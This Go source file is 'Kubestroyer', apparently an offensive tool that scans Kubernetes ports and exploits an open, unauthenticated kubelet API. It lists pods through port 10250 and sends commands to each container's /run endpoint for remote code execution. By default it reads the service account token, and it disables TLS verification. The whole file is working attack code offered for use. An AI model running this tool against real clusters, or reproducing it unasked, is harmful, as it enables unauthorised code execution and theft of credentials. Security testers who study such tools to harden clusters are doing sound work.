package main

import (
	"crypto/tls"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"strconv"
	"strings"

	"github.com/pborman/getopt/v2"
)

var toolname string = `
 _   __      _               _                             
| | / /     | |             | |                            
| |/ / _   _| |__   ___  ___| |_ _ __ ___  _   _  ___ _ __ 
|    \| | | | '_ \ / _ \/ __| __| '__/ _ \| | | |/ _ \ '__| v0.1
| |\  \ |_| | |_) |  __/\__ \ |_| | | (_) | |_| |  __/ |   
\_| \_/\__,_|_.__/ \___||___/\__|_|  \___/ \__, |\___|_|   
                                            __/ |          
                                           |___/ `
var author = `			                        By Rolix`
var split = `
--------------------------------------------------------
`
var scanNode = false
var target string
var anonRce = false
var rceCommand = "cat /var/run/secrets/kubernetes.io/serviceaccount/token"
var openPort []int

type RunningPods struct {
	Kind       string `json:"kind"`
	APIVersion string `json:"apiVersion"`
	Metadata   struct {
	} `json:"metadata"`
	Items []struct {
		Metadata struct {
			Name              string      `json:"name"`
			Namespace         string      `json:"namespace"`
			UID               string      `json:"uid"`
			CreationTimestamp interface{} `json:"creationTimestamp"`
		} `json:"metadata"`
		Spec struct {
			Containers []struct {
				Name      string `json:"name"`
				Image     string `json:"image"`
				Resources struct {
				} `json:"resources"`
			} `json:"containers"`
		} `json:"spec"`
		Status struct {
		} `json:"status"`
	} `json:"items"`
}

func nodeport_scan(target string, port int) {
	servAddr := target + ":" + strconv.Itoa(port)
	_, err := net.Dial("tcp", servAddr)
	if !strings.Contains(err.Error(), "connection refused") {
		openPort = append(openPort, port)
	}

}

func send_http_request(target string, port int, endpoint string) {
	http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
	resp, err := http.Get(target + ":" + strconv.Itoa(port) + endpoint)
	if err == nil {
		openPort = append(openPort, port)
		defer resp.Body.Close()
	}
}

func parse_pod(target string) *RunningPods {
	http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
	resp, err := http.Get("https://" + target + ":10250/runningpods/")
	if err != nil {
		fmt.Print("Fail execute request")
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		fmt.Print("Fail to read body")
	}

	pods := &RunningPods{}

	err = json.Unmarshal(body, &pods)
	if err != nil {
		log.Fatalln(err)
	}
	return pods

}

func anon_rce(runpod *RunningPods) {
	http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
	for i := 0; i < len(runpod.Items); i++ {
		found := false
		for j := 0; j < len(runpod.Items[i].Spec.Containers); j++ {
			namespace := runpod.Items[i].Metadata.Namespace
			pod := runpod.Items[i].Metadata.Name
			container := runpod.Items[i].Spec.Containers[j].Name
			url := "https://" + target + ":10250/run/" + namespace + "/" + pod + "/" + container
			method := "POST"

			payload := strings.NewReader("cmd=" + rceCommand)

			client := &http.Client{}
			req, err := http.NewRequest(method, url, payload)

			if err != nil {
				fmt.Println(err)
				return
			}
			req.Header.Add("Content-Type", "application/x-www-form-urlencoded")

			res, err := client.Do(req)
			if err != nil {
				fmt.Println(err)
				return
			}
			defer res.Body.Close()

			body, err := io.ReadAll(res.Body)
			if err != nil {
				fmt.Println(err)
				return
			}
			if body != nil && !strings.Contains(string(body), "failed") {
				found = true
				fmt.Println(string(body))
				break
			}
		}
		if found {
			break
		}
	}

}

func check_ports(target string) {
	knownPort := []int{443, 2379, 6666, 4194, 6443, 8443, 8080, 10250, 10255, 10256, 9099, 6782, 6783, 6784, 44134}

	if scanNode {
		for port := 30000; port <= 32767; port++ {
			nodeport_scan(target, port)
		}
	}
	target = "http://" + target
	endpoint := "/"

	for _, port := range knownPort {
		if port == 10250 {
			target := strings.Replace(target, "http", "https", 1)
			endpoint = "/metrics"
			send_http_request(target, port, endpoint)
		} else {

			send_http_request(target, port, endpoint)
		}

	}

	if len(openPort) != 0 {
		fmt.Println("Open Ports :")
		for _, port := range openPort {
			fmt.Println(strconv.Itoa(port))
		}
	} else {
		fmt.Println("No open ports")
	}

}

func main() {

	fmt.Println("\x1b[1;36m" + toolname + "\x1b[0m")
	fmt.Println("\x1b[1;32m" + author + "\x1b[0m")
	fmt.Println(split)

	getopt.FlagLong(&target, "target", 't', "target (IP or domain)").Mandatory()
	getopt.FlagLong(&scanNode, "node-scan", 0, "Enable/disable node port scan").SetOptional()
	getopt.FlagLong(&anonRce, "anon-rce", 0, "Directly try to RCE if kubelet API is open").SetOptional()
	getopt.Flag(&rceCommand, 'x', "Command to execute when using RCE")
	getopt.Parse()

	check_ports(target)

	if anonRce {
		pods := parse_pod(target)
		anon_rce(pods)
	}
}
